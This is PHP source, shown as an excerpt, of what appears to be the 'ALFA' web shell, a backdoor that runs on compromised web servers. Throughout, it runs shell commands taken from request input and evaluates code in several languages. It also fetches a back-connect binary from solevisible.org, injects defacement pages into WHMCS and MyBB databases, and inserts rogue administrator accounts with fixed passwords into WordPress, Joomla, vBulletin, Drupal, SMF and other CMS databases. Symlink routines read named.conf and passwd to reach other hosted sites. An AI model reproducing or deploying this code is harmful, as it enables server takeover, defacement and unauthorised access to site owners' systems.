	if(@move_uploaded_file($file['tmp_name'],$file['name'])){
		...
		$file_owner = $ow['name'] !== '' && $ow['name'] !== '0'?$ow['name']:(function_exists("fileowner")?@fileowner($file['name']):"????");
		$file_group = $gr['name'] !== '' && $gr['name'] !== '0'?$gr['name']:(function_exists("filegroup")?@filegroup($file['name']):"????");
		$file_modify = @date('Y-m-d H:i:s', @filemtime($file['name']));
		$file_perm = alfaPermsColor($file['name']);
		$file_size = @filesize($file['name']);
		$ret_files[] = ["name" => $file['name'], "size" => alfaSize($file_size), "perm" => $file_perm, "modify" => $file_modify, "owner" => $file_owner."/".$file_group];
	}
}
}
if(!$move_cmd_file){
...
if($GLOBALS['glob_chdir_false']){
	if(_alfa_can_runCommand(true,true)){
		if(_alfa_is_writable($GLOBALS['cwd'])){
			if(!_alfa_is_dir(trim((string) $_POST['alfa2']))){
				alfaEx("cd '".trim(addslashes((string) $_POST['c']))."';mkdir '".trim(addslashes((string) $_POST['alfa2']))."'");
				echo "<script>alfaShowNotification('".addslashes((string) $_POST['alfa2'])." created...', 'Files manager');</script>";
			}else{
	...
	if(_alfa_is_writable($GLOBALS['cwd'])){
		if(!_alfa_is_dir(trim((string) $_POST['alfa2']))){
			if(!@mkdir(trim((string) $_POST['alfa2']))){
				echo "<script>alfaShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
			}else{
				echo "<script>alfaShowNotification('".addslashes((string) $_POST['alfa2'])." created...', 'Files manager');</script>";
			}
...
if(@is_dir(rawurldecode((string) @$_POST['alfa2']))&&rawurldecode((string) @$_POST['alfa2']) !== '..'){
deleteDir(rawurldecode((string) @$_POST['alfa2']));
alfaEx("rm -rf '".addslashes((string) $_POST['alfa2'])."'",false,false);
}else{
@unlink(rawurldecode((string) @$_POST['alfa2']));
}
if($GLOBALS["glob_chdir_false"]){
	$source = rawurldecode((string) @$_POST['alfa2']);
	if($source !== '..' && !($source === '' || $source === '0') && _alfa_can_runCommand(true,true)){
		alfaEx("cd '".trim(addslashes((string) $_POST['c']))."';rm -rf '".addslashes($source)."'");
	}
}
if(is_array($_POST['f']))
return;
...
function move_paste($c,$s,$d): void{
if(@is_dir($c.$s)){
@mkdir($d.$s);
$h = @opendir($c.$s);
while (($f = @readdir($h)) !== false)
...
$zip = new ZipArchive();
$zipX = "alfa_".random_int(1,1000).".zip";
if($zip->open($zipX, 1)){
...
if(@is_dir($key)){
if(in_array(substr($key, strrpos($key,'/')+1),['.', '..'], true))continue;
...
break;
default:
if (!empty($_POST['alfa1']) && in_array($_POST['alfa1'], ["copy", "move", "zip", "unzip"])) {
...
if(preg_match("#(.*)\/\.\.#", (string) $_POST['c'], $res)){
	$path = explode('/', $res[1]);
	array_pop($path);
	$_POST['c'] = implode('/', $path);
}
$cmd_dir = false;
if ($dirContent === false && _alfa_can_runCommand(true,true)) {
    ...
    $dirContent = alfaEx("cd ".$tmp_getdir_path."/alfacgiapi;sh getdir.alfa '".addslashes($_POST['c'] ?? $GLOBALS['cwd'])."'");
    $dirContent = json_decode((string) $dirContent, true);
...
$alfa_sort_by = $_COOKIE["alfa_sort_by"] ?? 'name';
...
$alfa_filesman_direction = $_COOKIE["alfa_filesman_direction"] ?? 'asc';
$files_page_count = 1;
...
if(!empty($_POST['alfa1']) && preg_match('!s_([A-z]+)_(\d{1})!', (string) $_POST['alfa1'], $match)) {
$sort = [$match[1], (int)$match[2]];
}
if($alfa_files_page_number > ($files_page_count-1)){
	$alfa_files_page_number = 1;
}
$checkbox_rand = random_int(11111, 99999);
...
$file_perm = alfaPermsColor(["class"=>$dirContent[$i]["permcolor"],"num"=>$dirContent[$i]["permnum"],"human"=>$dirContent[$i]["permhuman"]],true);
$file_size = $dirContent[$i]["size"];
if(str_starts_with((string) $dirContent[$i]["name"], "/")){
...
$file_owner = $ow['name'] !== '' && $ow['name'] !== '0'?$ow['name']:(function_exists("fileowner")?@fileowner($GLOBALS['cwd'].$filename):"????");
$file_group = $gr['name'] !== '' && $gr['name'] !== '0'?$gr['name']:(function_exists("filegroup")?@filegroup($GLOBALS['cwd'].$filename):"????");
...
usort($files, alfaCmp(...));
usort($dirs, alfaCmp(...));
if (isset($_COOKIE["alfa_filesman_direction"]) && !empty($_COOKIE["alfa_filesman_direction"]) && $_COOKIE["alfa_filesman_direction"] == 'desc') {
...
$cc=0;
foreach($files as $f){
$f['name'] = htmlspecialchars((string) $f['name']);
...
function get_pagination_links($current_page, $total_pages): string{
    $links = "";
    if ($total_pages >= 1 && $current_page <= $total_pages) {
        ...
        for (; $i < min($current_page + 6, $total_pages); $i++) {
			$selected_page = $i == $current_page ? " active-page-number" : "";
            $links .= '<a onclick="pageChangedFilesMan(this);" class="page-number'.$selected_page.sprintf('">%s</a>', $i);
        }
        if ($i != $total_pages)
            $links .= '<a class="page-number">...</a>';
        ...
        $links .= '<a onclick="pageChangedFilesMan(this);" class="page-number'.$selected_page.sprintf('">%s</a>', $total_pages);
		$links .= '<a onclick="pageChangedFilesMan(this);" class="page-number">>></a>';
    }
    return $links;
}
function alfaFilesTools(): void{
alfahead();
echo '<div class="filestools" style="height: 100%;">';
if(isset($_POST['alfa1']))$_POST['alfa1'] = rawurldecode((string) $_POST['alfa1']);
...
if(!@chdir($_POST['c'])){
	...
	if($alfa_canruncmd){
		...
		$file_info = explode(":", (string) alfaEx('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "'.$slashed_alfa1.'"'));
...
$_POST['alfa2'] = 'image';
	...
	if ($chdir_fals && $alfa_canruncmd) {
        $mime = explode(":", (string) alfaEx("file --mime-type '".addslashes((string) $_POST['alfa1'])."'"));
        $mimetype = $mime[1];
        if(!($mimetype === '' || $mimetype === '0') && strstr($mimetype, "image")){
				$_POST['alfa2'] = 'image';
			}
    }
}
...
$_POST['alfa1'] = trim((string) $_POST['alfa1']);
if ($chdir_fals && $alfa_canruncmd && _alfa_is_writable($_POST["c"])) {
    alfaEx("cd '".addslashes((string) $_POST["c"])."';touch '".addslashes((string) $alfa1_decoded)."'");
    $_POST['alfa2'] = "edit";
}
...
$permcolor = alfaPermsColor(["class"=>$perm_color_class,"num"=>$file_info[5],"human"=>$file_info[6]],true);
}else{
...
if((!isset($uid['name'],$gid['name']) || empty($uid['name']) || empty($gid['name'])) && _alfa_can_runCommand()){
	[$uid['name'], $gid['name']] = explode(":", (string) alfaEx('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["alfa1"]).'"'));
}
}
if(str_starts_with((string) $_POST['alfa1'], "phar://")){
	$alfa_file_directory = $_POST['alfa1'];
}else{
	$alfa_file_directory = str_replace("//", "/",($chdir_fals?"":$_POST['c'].'/').$_POST['alfa1']);
}
echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> '.htmlspecialchars(basename((string) $alfa1_decoded)).' <span class="editor_file_info_vars">Size:</span> '.alfaSize($filesize).' <span class="editor_file_info_vars">Permission:</span> '.$permcolor.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].' <span class="editor_file_info_vars">Directory:</span> '.dirname((string) $alfa_file_directory).'</div>';
...
echo('<div>');
foreach($m as $v)
echo $v === 'Delete' ? '<a href="javascript:void(0);" onclick="var chk=confirm(\'Are You Sure For Delete This File ?\');chk?editor(\''.addslashes($rename_cache ?? $_POST['alfa1'])."','".strtolower($v)."','','".$_POST['c']."','".$_POST['alfa4']."','".$ftype.'\'):\'\';"><span class="editor_actions">'.((strtolower($v)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a> ' : '<a href="javascript:void(0);" onclick="editor(\''.addslashes($rename_cache ?? $_POST['alfa1'])."','".strtolower($v)."','','".$_POST['c']."','".$_POST['alfa4']."','".$ftype.'\')"><span class="editor_actions">'.((strtolower($v)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a>';
echo '</div>';
switch($_POST['alfa2']){
case 'view':case 'edit':
@chdir($_POST['c']);
...
if(!empty($_POST['alfa3'])){
$_POST['alfa3'] = substr((string) $_POST['alfa3'],1);
$time = @filemtime($_POST['alfa1']);
$fp = @__write_file($_POST['alfa1'],$_POST['alfa3']);
if($chdir_fals&&$alfa_canruncmd){
	$rname = $alfa1_decoded;
	$randname = $rname.random_int(111,9999);
	$filepath = dirname((string) $_SERVER["SCRIPT_FILENAME"])."/".$randname;
	if($fp = @__write_file($filepath ,$_POST['alfa3'])){
		alfaEx("mv '".addslashes($filepath)."' '".addslashes((string) $_POST["alfa1"])."';rm -f '".addslashes($filepath)."'");
	}
}
if($fp){
echo 'Saved!<br>';
...
if(!@unlink($_POST['alfa1'])){
	$deleted = false;
	if ($alfa_canruncmd && _alfa_is_writable($_POST['alfa1'])) {
        alfaEx("rm -f '".addslashes((string) $_POST['alfa1'])."'");
        $deleted = true;
    }
}
...
if(!empty($_POST['alfa3'])){
$perms = 0;
for($i=strlen((string) $_POST['alfa3'])-1;$i>=0;--$i)
$perms += (int)$_POST['alfa3'][$i]*8 ** (strlen((string) $_POST['alfa3']) - $i - 1);
if(!@chmod($_POST['alfa1'], $perms)){
if($chdir_fals&&$alfa_canruncmd){
alfaEx("cd '".addslashes((string) $_POST["c"])."';chmod ".addslashes((string) $_POST['alfa3'])." '".addslashes((string) $alfa1_decoded)."'");
echo('Success!');
}else{
...
$file_perm = $chdir_fals ? $file_info[5] : substr(sprintf('%o', @fileperms($_POST['alfa1'])),-4);
echo '<script>alfa3_="";</script><form onsubmit="editor(\''.addslashes((string) $_POST['alfa1'])."','".$_POST['alfa2']."',this.chmod.value,'".$_POST['c']."','".$_POST['alfa4']."','".$ftype.'\');return false;"><input type="text" name="chmod" value="'.$file_perm.'"><input type=submit value=" "></form>';
break;
case 'hexdump':
@chdir($_POST['c']);
...
case 'rename':
@chdir($_POST['c']);
$alfa1_escape = addslashes((string) $_POST["alfa1"]);
$alfa3_escape = addslashes((string) $_POST["alfa3"]);
if(!empty($_POST['alfa3'])){
$cmd_rename = false;
if($chdir_fals&&$alfa_canruncmd){
if(_alfa_is_writable($_POST['alfa1'])){
$alfa1_escape = addslashes((string) $alfa1_decoded);
alfaEx("cd '".addslashes((string) $_POST['c'])."';mv '".$alfa1_escape."' '".addslashes((string) $_POST['alfa3'])."'");
}else{
$cmd_rename = true;
}
}else{
...
@chdir($_POST['c']);
if( !empty($_POST['alfa3']) ) {
$time = strtotime((string) $_POST['alfa3']);
if($time){
$touched = false;
if($chdir_fals&&$alfa_canruncmd){
	alfaEx("cd '".addslashes((string) $_POST["c"])."';touch -d '".htmlspecialchars(addslashes((string) $_POST['alfa3']))."' '".addslashes((string) $alfa1_decoded)."'");
	$touched = true;
}
...
clearstatcache();
echo '<script>alfa3_="";</script><form onsubmit="editor(\''.addslashes((string) $_POST['alfa1'])."','".$_POST['alfa2']."',this.touch.value,'".$_POST['c']."','".$_POST['alfa4']."','".$ftype.'\');return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", ($chdir_fals?$file_info[4]:@filemtime($_POST['alfa1']))).'"><input type=submit value=" "></form>';
break;
case 'image':
@chdir($_POST['c']);
echo('<hr>');
...
$height = $image_info[1];
if($chdir_fals&&$alfa_canruncmd){
	$source = alfaEx("cat '".addslashes((string) $file)."' | base64");
	[$width, $height] = explode(":", (string) alfaEx("identify -format '%w:%h' '".addslashes((string) $file)."'"));
	$mime = explode(":", (string) alfaEx("file --mime-type '".addslashes((string) $file)."'"));
...
function findicon($file,$type): string{
$s = 'http://solevisible.org/icons/';
$types = ['json','ppt','pptx','xls','xlsx','msi','config','cgi','pm','c','cpp','cs','java','aspx','asp','db','ttf','eot','woff','woff2','woff','conf','log','apk','cab','bz2','tgz','dmg','izo','jar','7z','iso','rar','bat','sh','alfa','gz','tar','php','php4','php5','phtml','html','xhtml','shtml','htm','zip','png','jpg','jpeg','gif','bmp','ico','txt','js','rb','py','xml','css','sql','htaccess','pl','ini','dll','exe','mp3','mp4','m4a','mov','flv','swf','mkv','avi','wmv','mpg','mpeg','dat','pdf','3gp','doc','docx','docm'];
if($type!='file'){
...
if($GLOBALS["glob_chdir_false"]){
	$randname = $basename.random_int(111,9999);
	$scriptpath = dirname((string) $_SERVER["SCRIPT_FILENAME"]);
...
function __alfa_set_cookie($key, $value): void{
	$_COOKIE[$key] = $value;
	@setcookie($key, (string) $value, ['expires' => time()+(86400 * 7), 'path' => '/']);
}
function alfaphpeval(): void{
if(isset($_COOKIE["eval_tmpdir"])&&@is_dir($_COOKIE["eval_tmpdir"])){
	$tempdir = __ZGVjb2Rlcg($_COOKIE["eval_tmpdir"]);
}else{
	$tempdir = dirname((string) alfaEx("mktemp"));
...
$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',(string) $tmp);
...
$result = htmlspecialchars(ob_get_clean());
	...
	$lang = $_POST['alfa3'];
	$filename = "temp".random_int(11111,99999);
	$temp = $tempdir."/".$filename ;
	__write_file($filename, $_POST['alfa1']);
	$result = alfaEx(sprintf('mv %s %s;%s %s;rm -f %s', $filename, $temp, $lang, $temp, $temp));
	@unlink($filename);
	@unlink($temp);
}
...
function alfahash(): void{
if(!function_exists('hex2bin')) {function hex2bin($p): string {return decbin(hexdec((string) $p));}}
if(!function_exists('full_urlencode')) {function full_urlencode($p): string{$r='';for($i=0;$i<strlen((string) $p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
$stringTools = [
...
echo "</select> <input type='submit' value=' '/><br><textarea  name='input' style='margin-top:5px' class='bigarea'>".(empty($_POST['alfa1'])?'':htmlspecialchars((string) @$_POST['alfa2']))."</textarea></form>";
if(!empty($_POST['alfa1'])){
$string = addslashes((string) $_POST['alfa2']);
...
echo sprintf('<center>%d (', $packets) . @round(($packets*65)/1024, 2) . " MB) packets averaging ". @round($packets/$exec_time, 2) . " packets per second</center>";
echo "</pre>";
}
echo '</div>';
alfafooter();
}
function __pre(): string{return('<pre id="strOutput" style="margin-top:5px" class="ml1">');}
function alfaIndexChanger(): void{
alfahead();
...
$table = ['td1' =>
 ['color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'],
 'td2' =>
 ['color' => 'FFFFFF', 'tdName' => 'URL', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'],
 'td3' =>
 ['color' => 'FFFFFF', 'tdName' => 'File Name', 'inputName' => 'fname', 'inputValue' => '', 'inputSize' => '50'],
 'td4' =>
 ['color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'],
 'td5' =>
 ['color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'],
...
$tempSave1 = $soleGet['message'];
$tempSave = str_replace("'","\'",$tempSave1);
$inject = sprintf("UPDATE tblemailtemplates SET message='%s' WHERE name='Password Reset Validation'", $Def);
$result=@mysqli_query($conn,$inject) or die (mysqli_error($conn));
$create = "insert into tblclients (email) values('solevisible@fbi.gov')";
$result2 =@mysqli_query($conn,$create) or die (mysqli_error($conn));
if(function_exists('curl_version')){
...
$table = ['td1' =>
 ...
 ['color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'],
 'td5' =>
 ['color' => 'FFFFFF', 'tdName' => 'Prefix', 'inputName' => 'prefix', 'id' => 'db_prefix', 'inputValue' => '', 'inputSize' => '50']
];
create_table($table);
echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name='index' rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
...
$set_index .= __ZW5jb2Rlcg(sprintf('echo "%s";', $index));
$set_index .= "\'))}}{\${exit()}}";
if(!empty($dbh)&&!empty($dbu)&&!empty($dbn)&&!empty($index)){
$conn=@mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_error($conn));
...
@mysqli_query($conn,$loli1) || die (mysqli_error($conn));
@mysqli_query($conn,$loli2) || die (mysqli_error($conn));
@mysqli_query($conn,$loli3) || die (mysqli_error($conn));
...
";
$table = ['td1' =>
 ['color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'mybbdbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'],
 'td2' =>
 ['color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'mybbdbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'],
 'td3' =>
 ['color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'mybbdbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'],
 'td4' =>
 ['color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'mybbdbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50']
];
create_table($table);
echo "<br><div class='txtfont'>| Your Index |</div><br>
...
function alfaproc(): void
{
alfahead();
echo "<Div class=header><br><center>";
if(empty($_POST['ajax'])&&!empty($_POST['alfa1']))
$_COOKIE[md5((string) $_SERVER['HTTP_HOST']).'ajax'] = false;
if($GLOBALS['sys']=="win"){
$process=[
...
if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$cmd = "cd '".addslashes((string) $_POST["c"])."';";}
...
if(@preg_match('#zone#mi',(string) $solevisible13)){
preg_match_all('#zone "(.*)"#',(string) $solevisible13,$solevisible14);
...
echo __pre().sprintf("<center><table border='1'><tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">%s</font></b></td></tr><tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">%s</font></b></td></tr></table></center>", $user, $rep);
...
function __get_resource($content): string|false{
return @gzinflate(__ZGVjb2Rlcg($content));
}
function __write_file($file, $content): bool{
if(!$fh = @fopen($file, "wb")){
return false;
}
return fwrite($fh, (string) $content)!==false;
}
function bcinit($evalType, $evalCode, $evalOptions, $evalArguments): string|false{
$res = "<font color='green'>[ Success...! ]</font>";
$err = "<font color='red'>[ Failed...! ]</font>";
if($evalOptions!="") $evalOptions .= " ";
...
if ($evalType=="java") {
    ...
    chdir($tmpdir);
    if(is_writable($tmpdir)){
    if(preg_match("/class\ ([^{]+){/i",(string) $evalCode, $r)){
    $classname = trim($r[1]);
    $filename = $classname;
    }else{
    $uniq = substr(md5(time()),0,8);
...
$cbArr = ["php"=>"Php","perl"=>"Perl","python"=>"Python","ruby"=>"Ruby","c"=>"C","java"=>"Java","node"=>"NodeJs","bcwin"=>"Windows"];
foreach($cbArr as $key=>$val){echo(sprintf("<option value='%s' ", $key).($GLOBALS['sys']=='win'?'selected':'').sprintf('>%s</option>', $val));}
...
$tmpdir = ALFA_TEMPDIR;
$name = $tmpdir.'/'.$lang.uniqid().random_int(1,99999);
...
$out = alfaEx(sprintf('%s %s %s %s', $lang, $name, $arg, $os));
if($out==''){$out="<font color='green'><center>[ Finished...! ]</center></font>";}
echo(sprintf("<pre class='ml1' style='margin-top:5px'>%s</pre>", $out));
}
}else{
...
$out = nl2br((string) bcinit($lang, $code,'',''));
echo(sprintf("<pre class=ml1 style='margin-top:5px'><center>%s</center></pre>", $out));
}
if($lang=='bcwin'){
$alfa = new AlfaCURL();
$s = $alfa->Send('http://solevisible.org/bc/windows.exe');
$tmpdir = ALFA_TEMPDIR;
...
$alfa = new AlfaCURL();
while($i < count($sites)){
if(!str_starts_with($sites[$i], "http")){
...
function alfapwchanger(): void{
alfahead();

echo '<div class=header><center><br><div class="txtfont_header">| Add New Admin |</div>
<center><h3>';
$vals = ['WordPress' => ['wp',2],'Joomla' => ['joomla',3],'vBulletin' => ['vb',5],'phpBB' => ['phpbb',6],'WHMCS' => ['whmcs',7],'MyBB' => ['mybb',8],'Php Nuke' => ['nuke',9],'Drupal' => ['drupal',10],'SMF' => ['smf',11]];
...
$table = ['td1' =>
 ['color' => 'FFFFFF', 'tdName' => 'Mysql Host','id'=>'db_host', 'inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'],
 'td2' =>
 ['color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'],
 'td3' =>
 ['color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'],
 'td4' =>
 ['color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'],
 'td5' =>
 ['color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => 'wp_', 'inputSize' => '50'],
 'td6' =>
 ['color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'],
 'td7' =>
 ['color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true],
 'td8' =>
 ['color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50']
];
create_table($table);
...
$solevisible=@mysqli_query($conn,"insert into ".$prefix.sprintf("users (ID,user_login,user_pass,user_email) values(null,'%s','d4a590caacc0be55ef286e40a945ea45','%s')", $admin, $SQL)) or die(mysqli_error($conn));
...
$table = ['td1' =>
 ...
 ['color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'],
 'td5' =>
 ['color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => 'jos_', 'inputSize' => '50'],
 'td6' =>
 ['color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'],
 'td7' =>
 ['color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true],
 'td8' =>
 ['color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50']
];
create_table($table);
...
$table = ['td1' =>
 ...
 ['color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'],
 'td5' =>
 ['color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'],
 'td6' =>
 ['color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'],
 'td7' =>
 ['color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true],
 'td8' =>
 ['color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50']
];
create_table($table);
...
$pw_col = @mysqli_connect(sprintf("SELECT column_name FROM information_schema.columns where table_name = '%suser' and column_name = 'password' and table_schema = '%s'", $prefix, $database));
$pw_col = @mysqli_num_rows($pw_col);
$adm_perm = "16744444";
if($pw_col > 0){
$solevisible=@mysqli_query($conn,sprintf("insert into %suser (userid,usergroupid,username,password,salt,email,passworddate,joindate) values(null,'6','%s','52e28b78f55641cd4618ad1a20f5fd5c','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','%s','", $prefix, $admin, $SQL).date('Y-m-d')."','".time()."')") or die(mysqli_error($conn));
}else{
$adm_perm = "2143256444";
$solevisible=@mysqli_query($conn,sprintf("insert into %suser (userid,usergroupid,username,token,secret,email,passworddate,joindate,scheme,birthday_search) values(null,'6','%s','\$2y\$10\$YsVhV.9tLnzBYxar1BJAGO3vFz68/qDU7Jt62SDdLy6lUT9N5Z/wq','Qf~ADeA}iAey-&#ALQF<}/uBDqSnw>','%s','", $prefix, $admin, $SQL).date('Y-m-d')."','".time()."','blowfish:10','1984-05-20')") or die(mysqli_error($conn));
}
$solevisible=@mysqli_query($conn,sprintf("select userid from %suser where username='", $prefix).$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($solevisible);
if($sole == 1){
$solevis = mysqli_fetch_assoc($solevisible);
$res = $solevis['userid'];
}
$solevisible=@mysqli_query($conn,sprintf("insert into %sadministrator (userid,adminpermissions) values('", $prefix).$res."','".$adm_perm."')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
...
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5($pwd);
$solevisible=@mysqli_query($conn,"insert into ".$prefix.sprintf("_authors(aid,name,email,pwd) values('%s','God','%s','d4a590caacc0be55ef286e40a945ea45')", $admin, $SQL)) or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
...
$solevisible=@mysqli_query($conn,sprintf("insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('%s','%s','\$S\$DP2y9AbolCBOd\\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','solevisible@fbi.gov','filtered_html','1','Europe/Berlin','solevisible@fbi.gov')", $getDescuid, $admin)) or die(mysqli_error($conn));
...
$table = ['td1' =>
 ...
 ['color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'],
 'td5' =>
 ['color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => 'smf_', 'inputSize' => '50'],
 'td6' =>
 ['color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'],
 'td7' =>
 ['color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true],
...
$admin = $_POST['alfa8'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$setpwAlg = sha1(strtolower((string) $admin) . 'solevisible');
$solevisible=@mysqli_query($conn,sprintf("insert into %smembers (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'%s','1','%s','%s','solevisible@fbi.gov')", $prefix, $admin, $admin, $setpwAlg)) or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
...
function alfaMakePwd(): string{
	...
	$document = explode("/", (string) $_SERVER["DOCUMENT_ROOT"]);
	$public = end($document);
	array_pop($document);
	array_pop($document);
	return implode("/", $document) . "/{user}/" . $public;
}
function alfaGetDomains($state = false): array{
	$state = "named.conf";
...
function alfaCreateParentFolder(): void{
	$parent = $GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__;
	if(!@is_dir($parent)){
		@mkdir($parent, 0755, true);
	}
}
function alfasymlink(): void{
alfahead();
AlfaNum(9,10);
alfaCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
...
if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
	...
	@chmod($cginame,0755);
	echo __pre();
	$resource = alfaEx(sprintf('%s %s %s', $lang, $cginame, $sympath),false,true,true);
	if((string) $resource === ''){
...
if($solevisible58){
$new_name = str_replace(".", "_", basename((string) $symname));
$rand_dir = $new_name.random_int(111,9999);
$sym_dir = 'alfasymlinkphp/'.$rand_dir.'/';
@mkdir($sym_dir, 0777, true);
alfacgihtaccess('sym', $sym_dir, $symname);
_alfa_symlink($path,sprintf('%s/%s', $sym_dir, $symname));
echo __pre();
...
foreach($lines as $line){
	...
	if($anonymous){
		...
		foreach($anony_domains as $anony){
			if($state == "named.conf"){
				if(@strstr((string) $anony, 'zone')){
					preg_match_all('#zone "(.*)"#',(string) $anony, $data);
					$domain = $data[1][0];
				}else{
					continue;
				}
                ...
                if($state == "named")$anony = rtrim((string) $anony, ".db");
				$domain = $anony;
			}
			$sub_domain = str_replace(["-","."], "", $domain);
			if(substr($owner, 0, $owner_len) === substr($sub_domain, 0, $owner_len)){
				if(in_array($owner.$domain, $temp_black, true))continue;
		...
		if(!$finded){
 		...
 		if($state == "named.conf"){
			if(@strstr((string) $line, 'zone')){
				preg_match_all('#zone "(.*)"#',(string) $line, $data);
				$domain = $data[1][0];
			}else{
				continue;
			}
            ...
            if($state == "named")$line = rtrim((string) $line, ".db");
			$domain = $line;
		}
		if(strlen(trim((string) $domain)) > 2 && $state != "passwd"){
	...
	if(!$anonymous){
        ...
        if (in_array($owner.$domain, $f_black, true)) {
            continue;
        }
        $sympath = str_replace("{user}", $owner, $makepwd);
		$http = "http://".$domain;
...
if($sole){
	foreach($sole as $visible){
		if(@strstr((string) $visible,":")){
			$solevisible = explode(':', (string) $visible);
			$cwd = str_replace("{user}", trim($solevisible[1]), $makepwd);
			echo str_replace(["{count}","{user}","{url}","{cwd}"], [$count++, trim($solevisible[1]), trim($solevisible[0]), $cwd], $template);
		}
	}
}else{
		...
		foreach($site_domains as $line){
			if($is_named){
				if(@strstr($line, 'zone')){
					...
					$domain = $data[1][0];
					if(strlen($domain  > 2) && ($domain !== '' && $domain !== '0')){
						$domains[] = $domain;
					}
				}
			}else{
...
public function connect(array $host, $user, $pass, $dbname): bool{
switch($this->type){
